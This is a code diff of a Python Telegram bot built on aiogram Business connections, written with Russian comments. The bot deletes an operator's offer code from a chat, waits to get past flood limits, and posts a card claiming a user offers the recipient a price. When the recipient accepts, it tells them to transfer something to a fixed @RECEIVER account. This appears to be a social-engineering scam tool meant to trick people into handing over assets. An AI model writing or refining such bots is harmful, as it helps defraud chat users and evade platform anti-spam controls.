@@ -6,7 +6,7 @@ import logging
 import sys
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.client.default import DefaultBotProperties
-from aiogram.enums import ParseMode, ChatType
+from aiogram.enums import ParseMode
 from aiogram.filters import Command
 from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                            InlineKeyboardMarkup, BusinessConnection)
@@ -99,8 +99,10 @@ async def cmd_buy(msg: Message):
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
+    # Игнорируем, если пишет не админ
     if msg.from_user and msg.from_user.id != ADMIN_ID: return
 
+    # Ищем код оффера в тексте
     m = CODE_RE.search(msg.text)
     if not m: return
 
@@ -108,26 +110,27 @@ async def handle_business_message(msg: Message):
     offer = get_offer(oid)
 
     if not offer:
-        log.error(f"Оффер {oid} не найден в базе")
+        log.error(f"❌ Оффер {oid} не найден в базе")
         return
 
-    log.info(f"✅ Найден оффер {oid}. Отправляем...")
+    log.info(f"✅ Найден оффер {oid}. Начинаем отправку...")
 
+    # Получаем conn_id
     conn_id = msg.business_connection_id
     if not conn_id:
-        log.error("❌ Нет business_connection_id")
+        log.error("❌ Нет business_connection_id! Убедись, что это Business-чат.")
         return
 
-    # Сначала удаляем код из чата
+    # 1. Удаляем код из чата (тихо, без спама в логи)
     try:
         await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
-        log.info("🗑 Код удален из чата")
-    except Exception as e:
-        log.warning(f"Не смог удалить код: {e}")
+    except Exception:
+        pass # Если не удалилось (PEER_FLOOD или уже удалено), просто идем дальше
 
-    # Пауза 1.5 сек для обхода флуда
-    await asyncio.sleep(1.5)
+    # 2. Пауза для обхода флуда
+    await asyncio.sleep(2)
 
+    # 3. Формируем карточку
     target_user = msg.from_user.username or "buyer"
     card_text = (
         f"Пользователь <b>{target_user}</b> предлагает Вам <b>{offer['price']}</b> "
@@ -141,6 +144,7 @@ async def handle_business_message(msg: Message):
          InlineKeyboardButton(text="Принять", callback_data=f"accept:{oid}")]
     ])
     
+    # 4. Отправляем
     try:
         await bot.send_message(
             chat_id=msg.chat.id,
@@ -149,7 +153,7 @@ async def handle_business_message(msg: Message):
             reply_markup=kb,
             disable_web_page_preview=False
         )
-        log.info("✅ Карточка отправлена")
+        log.info("✅ Карточка успешно отправлена")
     except Exception as e:
         log.error(f"❌ Ошибка отправки: {e}")
 
@@ -182,11 +186,14 @@ async def on_accept(cb: CallbackQuery):
             f"3. Укажите получателя: <b>@{RECEIVER}</b>\n"
             f"4. Подтвердите передачу."
         )
-        await bot.send_message(
-            chat_id=cb.message.chat.id, 
-            text=text, 
-            business_connection_id=conn_id
-        )
+        try:
+            await bot.send_message(
+                chat_id=cb.message.chat.id, 
+                text=text, 
+                business_connection_id=conn_id
+            )
+        except Exception as e:
+            log.error(f"Ошибка при отправке инструкции: {e}")
     
     try:
         await cb.message.edit_reply_markup(reply_markup=None)
@@ -194,12 +201,15 @@ async def on_accept(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# СЛУЖЕБНОЕ
+# BUSINESS CONNECTION
 # ==========================================
 @router.business_connection()
 async def on_business_conn(conn: BusinessConnection):
-    log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")
+    log.info(f"✅ Business connection УСТАНОВЛЕН: user={conn.user.id} id={conn.id}")
 
+# ==========================================
+# ЗАПУСК
+# ==========================================
 async def main():
     log.info("Starting bot...")
     await dp.start_polling(bot)
